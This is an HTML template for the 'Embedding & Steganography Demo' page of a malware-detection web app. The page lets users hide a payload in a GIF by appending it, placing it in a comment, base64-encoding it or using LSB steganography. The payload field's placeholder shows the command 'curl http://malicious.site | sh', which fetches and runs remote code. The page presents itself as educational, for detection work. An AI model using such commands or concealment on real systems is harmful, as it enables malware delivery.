<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>VigilantEye - Embedding & Steganography Demo</title>
  <link rel="icon" type="image/svg+xml" href="{{ url_for('static', filename='favicon.svg') }}">
  <link rel="alternate icon" href="{{ url_for('static', filename='favicon.svg') }}">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <link href="{{ url_for('static', filename='style.css') }}" rel="stylesheet">
  <script src="{{ url_for('static', filename='theme.js') }}" defer></script>
</head>
<body>

<nav class="navbar navbar-expand-lg navbar-dark">
  <div class="container-fluid">
    <a class="navbar-brand" href="{{ url_for('home') }}">
      <i class="bi bi-shield-check"></i>
      <span>VigilantEye</span>
    </a>
    <div class="navbar-nav ms-auto d-flex flex-row align-items-center gap-2">
      <button id="themeToggle" class="theme-toggle" onclick="toggleTheme()" title="Switch Theme">
        <i class="bi bi-moon-fill"></i>
      </button>
      <a href="{{ url_for('index') }}" class="nav-link-btn" title="Scan">
        <i class="bi bi-search"></i>
        <span class="d-none d-md-inline">Scan</span>
      </a>
      <a href="{{ url_for('embed_demo') }}" class="nav-link-btn" title="Embedding Demo">
        <i class="bi bi-code-slash"></i>
        <span class="d-none d-md-inline">Embed Demo</span>
      </a>
      <a href="{{ url_for('embedding_info') }}" class="nav-link-btn nav-link-btn-primary" title="Methods Info">
        <i class="bi bi-info-circle-fill"></i>
        <span class="d-none d-md-inline">Methods</span>
      </a>
      <a href="{{ url_for('about') }}" class="nav-link-btn" title="About">
        <i class="bi bi-info-circle"></i>
        <span class="d-none d-md-inline">About</span>
      </a>
      {% if session.get('username') %}
        <div class="user-menu">
          <button class="user-menu-btn" id="userMenuBtn" onclick="toggleUserMenu()">
            <i class="bi bi-person-circle"></i>
            <span class="d-none d-md-inline">{{ session['username'] }}</span>
            <i class="bi bi-chevron-down ms-1"></i>
          </button>
          <div class="user-dropdown" id="userDropdown">
            <div class="user-dropdown-header">
              <i class="bi bi-person-circle"></i>
              <div>
                <strong>{{ session['username'] }}</strong>
                <small>Logged in</small>
              </div>
            </div>
            <div class="user-dropdown-divider"></div>
            <a href="{{ url_for('logout') }}" class="user-dropdown-item">
              <i class="bi bi-box-arrow-right"></i>
              <span>Logout</span>
            </a>
          </div>
        </div>
      {% else %}
        <a href="{{ url_for('login') }}" class="nav-link-btn">
          <i class="bi bi-box-arrow-in-right"></i>
          <span class="d-none d-md-inline">Login</span>
        </a>
        <a href="{{ url_for('signup') }}" class="nav-link-btn nav-link-btn-primary">
          <i class="bi bi-person-plus"></i>
          <span class="d-none d-md-inline">Sign Up</span>
        </a>
      {% endif %}
    </div>
  </div>
</nav>

<div class="container-fluid px-3 px-md-4">
  <div class="row g-4">
    <!-- Main Content Area -->
    <div class="col-12">
      <div class="card position-relative main-scan-card">
        <div class="text-center mb-4">
          <h1 class="logo">
            <i class="bi bi-code-slash"></i> Embedding & Steganography Demo
          </h1>
          <p style="color: var(--text-secondary);" class="fs-5">Demonstrate GIF Embedding Techniques</p>
          <p style="color: var(--text-secondary);">Upload a GIF and payload to see how malware can be embedded using various steganography methods</p>
        </div>

        <form method="POST" enctype="multipart/form-data" id="embedForm">
          <!-- GIF Upload -->
          <div class="mb-4">
            <label class="form-label" style="color: var(--text-primary); font-weight: 600; margin-bottom: 1rem;">
              <i class="bi bi-file-earmark-image"></i> Upload GIF File
            </label>
            <div class="upload-area" 
                 onclick="document.querySelector('input[type=file]').click()"
                 ondrop="handleDrop(event)" 
                 ondragover="handleDragOver(event)" 
                 ondragleave="handleDragLeave(event)">
              <div class="upload-icon">
                <i class="bi bi-cloud-upload"></i>
              </div>
              <h5 style="color: var(--text-primary);" class="mb-3">Drag & Drop or Click to Upload GIF</h5>
              <p style="color: var(--text-secondary);" class="mb-3">Supported format: .gif files only</p>
              <input type="file" class="form-control d-none" name="gif_file" accept=".gif" required id="fileInput" onchange="updateFileName(this)">
              <div id="fileName" class="text-primary mt-2"></div>
            </div>
          </div>

          <!-- Payload Input -->
          <div class="mb-4">
            <label class="form-label" style="color: var(--text-primary); font-weight: 600;">
              <i class="bi bi-terminal"></i> Payload to Embed
            </label>
            <textarea 
              class="form-control" 
              name="payload_text" 
              rows="5" 
              placeholder="Enter the payload/malware code to embed (e.g., curl http://malicious.site | sh)"
              required
              style="font-family: 'Courier New', monospace; resize: vertical;"></textarea>
            <small style="color: var(--text-secondary);" class="form-text">
              This is for educational/demonstration purposes only. Enter the payload you want to embed into the GIF.
            </small>
          </div>

          <!-- Embedding Method Selection -->
          <div class="mb-4">
            <label class="form-label" style="color: var(--text-primary); font-weight: 600; margin-bottom: 1rem;">
              <i class="bi bi-gear"></i> Select Embedding Method
            </label>
            <div class="row g-3">
              <div class="col-md-6 col-lg-3">
                <input type="radio" class="btn-check" name="embedding_method" id="method_append" value="append" checked>
                <label class="btn btn-outline-primary model-card" for="method_append">
                  <div class="model-card-content">
                    <i class="bi bi-file-plus model-icon"></i>
                    <div class="model-name">Append</div>
                    <div class="model-desc">After Terminator</div>
                    <small class="model-badge">Simple</small>
                  </div>
                </label>
              </div>
              <div class="col-md-6 col-lg-3">
                <input type="radio" class="btn-check" name="embedding_method" id="method_comment" value="comment">
                <label class="btn btn-outline-primary model-card" for="method_comment">
                  <div class="model-card-content">
                    <i class="bi bi-chat-left-text model-icon"></i>
                    <div class="model-name">Comment</div>
                    <div class="model-desc">GIF Extension</div>
                    <small class="model-badge">Standard</small>
                  </div>
                </label>
              </div>
              <div class="col-md-6 col-lg-3">
                <input type="radio" class="btn-check" name="embedding_method" id="method_base64" value="base64">
                <label class="btn btn-outline-primary model-card" for="method_base64">
                  <div class="model-card-content">
                    <i class="bi bi-shield-lock model-icon"></i>
                    <div class="model-name">Base64</div>
                    <div class="model-desc">Encoded Append</div>
                    <small class="model-badge">Obfuscated</small>
                  </div>
                </label>
              </div>
              <div class="col-md-6 col-lg-3">
                <input type="radio" class="btn-check" name="embedding_method" id="method_lsb" value="lsb">
                <label class="btn btn-outline-primary model-card" for="method_lsb">
                  <div class="model-card-content">
                    <i class="bi bi-eye-slash model-icon"></i>
                    <div class="model-name">LSB</div>
                    <div class="model-desc">Steganography</div>
                    <small class="model-badge">Advanced</small>
                  </div>
                </label>
              </div>
            </div>
          </div>

          <button type="submit" class="btn btn-primary w-100 mt-4" id="embedBtn">
            <i class="bi bi-magic"></i> Embed Payload & Generate Embedding Info
          </button>
        </form>

        <!-- Error Message -->
        {% if error %}
        <div class="alert alert-danger mt-4" role="alert">
          <i class="bi bi-exclamation-triangle-fill"></i> {{ error }}
        </div>
        {% endif %}

        <!-- Results -->
        {% if result %}
        <div class="result-box mt-4 bg-success">
          <div class="d-flex align-items-center justify-content-between mb-3">
            <h4 class="mb-0">
              <i class="bi bi-check-circle-fill"></i>
              Embedding Successful
            </h4>
            <span class="status-badge clean">
              COMPLETE
            </span>
          </div>

          <!-- Embedding Details -->
          <div class="row g-3 mt-3">
            <div class="col-md-6">
              <div class="p-3 rounded" style="background: var(--bg-overlay);">
                <small style="color: var(--text-secondary);" class="d-block mb-1">Embedding Method</small>
                <strong class="d-block">
                  <span class="method-badge">{{ result.method }}</span>
                </strong>
              </div>
            </div>
            <div class="col-md-6">
              <div class="p-3 rounded" style="background: var(--bg-overlay);">
                <small style="color: var(--text-secondary);" class="d-block mb-1">Payload Size</small>
                <strong class="d-block" style="color: var(--success-color);">
                  {{ result.details.payload_size }} bytes
                </strong>
              </div>
            </div>
          </div>

          <div class="row g-3 mt-2">
            <div class="col-md-6">
              <div class="p-3 rounded" style="background: var(--bg-overlay);">
                <small style="color: var(--text-secondary);" class="d-block mb-1">Original File Size</small>
                <strong class="d-block">{{ result.original_size }} bytes</strong>
              </div>
            </div>
            <div class="col-md-6">
              <div class="p-3 rounded" style="background: var(--bg-overlay);">
                <small style="color: var(--text-secondary);" class="d-block mb-1">Embedded File Size</small>
                <strong class="d-block" style="color: var(--primary-color);">
                  {{ result.embedded_size }} bytes
                </strong>
              </div>
            </div>
          </div>

          <!-- Method Description -->
          <div class="mt-4">
            <h6 class="mb-2">
              <i class="bi bi-info-circle"></i> Method Details:
            </h6>
            <div class="p-3 rounded" style="background: var(--bg-overlay);">
              <p class="mb-2" style="color: var(--text-primary);">
                <strong>{{ result.details.description }}</strong>
              </p>
              <small style="color: var(--text-secondary);">
                Offset: {{ result.details.offset }} | 
                {% if result.details.encoded_size %}
                Encoded Size: {{ result.details.encoded_size }} bytes |
                {% endif %}
                Payload: {{ result.payload_preview }}
              </small>
            </div>
          </div>

          <!-- File Previews -->
          <div class="row g-4 mt-4">
            <div class="col-md-6">
              <h6 class="mb-3">
                <i class="bi bi-file-image"></i> Original GIF
              </h6>
              <div class="text-center gif-preview">
                <img src="{{ url_for('static', filename='uploads/' + result.original_file) }}" 
                     alt="Original GIF"
                     class="img-fluid rounded"
                     style="max-height: 300px;">
                <p class="mt-2 mb-0" style="color: var(--text-secondary); font-size: 0.85rem;">
                  {{ result.original_file }}
                </p>
              </div>
            </div>
            <div class="col-md-6">
              <h6 class="mb-3">
                <i class="bi bi-file-earmark-code"></i> Embedded GIF
              </h6>
              <div class="text-center gif-preview">
                <img src="{{ url_for('static', filename='uploads/embedded/' + result.embedded_file) }}" 
                     alt="Embedded GIF"
                     class="img-fluid rounded"
                     style="max-height: 300px;">
                <p class="mt-2 mb-0" style="color: var(--text-secondary); font-size: 0.85rem;">
                  {{ result.embedded_file }}
                </p>
              </div>
            </div>
          </div>

          <!-- Embedding Info (LLM) -->
          {% if llm_explanation %}
          <div class="mt-5">
            <h5 class="mb-3">
              <i class="bi bi-info-square"></i> Embedding Info (Key Points)
            </h5>
            <div class="p-4 rounded" style="background: var(--bg-overlay); border: 1px solid var(--border-color);">
              <div style="color: var(--text-primary); white-space: pre-wrap; line-height: 1.8; font-size: 0.95rem;">
                {{ llm_explanation }}
              </div>
            </div>
          </div>
          {% endif %}
        </div>
        {% endif %}
      </div>
    </div>
  </div>
</div>

<div class="footer">
  <p>&copy; 2025 VigilantEye | AI-Powered Malware Detection | Built with Flask & PyTorch</p>
</div>

<script>
  function updateFileName(input) {
    const fileName = input.files[0]?.name;
    const fileNameDiv = document.getElementById('fileName');
    if (fileName) {
      fileNameDiv.innerHTML = `<i class="bi bi-file-earmark-check"></i> Selected: <strong>${fileName}</strong>`;
      fileNameDiv.style.color = 'var(--success-color)';
    }
  }

  // Drag and Drop Handlers
  function handleDragOver(e) {
    e.preventDefault();
    e.stopPropagation();
    e.currentTarget.classList.add('dragover');
  }

  function handleDragLeave(e) {
    e.preventDefault();
    e.stopPropagation();
    e.currentTarget.classList.remove('dragover');
  }

  function handleDrop(e) {
    e.preventDefault();
    e.stopPropagation();
    e.currentTarget.classList.remove('dragover');
    
    const files = e.dataTransfer.files;
    if (files.length > 0 && files[0].name.endsWith('.gif')) {
      const fileInput = document.getElementById('fileInput');
      fileInput.files = files;
      updateFileName(fileInput);
    }
  }

  // User Menu Toggle
  function toggleUserMenu() {
    const dropdown = document.getElementById('userDropdown');
    const btn = document.getElementById('userMenuBtn');
    
    if (dropdown && btn) {
      dropdown.classList.toggle('show');
      btn.classList.toggle('active');
    }
  }

  // Close user menu when clicking outside
  document.addEventListener('click', function(event) {
    const userMenu = document.querySelector('.user-menu');
    const dropdown = document.getElementById('userDropdown');
    const btn = document.getElementById('userMenuBtn');
    
    if (userMenu && dropdown && btn && !userMenu.contains(event.target)) {
      dropdown.classList.remove('show');
      btn.classList.remove('active');
    }
  });

  // Form submission loading
  document.getElementById('embedForm').addEventListener('submit', function(e) {
    const btn = document.getElementById('embedBtn');
    btn.disabled = true;
    btn.innerHTML = '<i class="bi bi-hourglass-split"></i> Embedding...';
  });
</script>

</body>
</html>

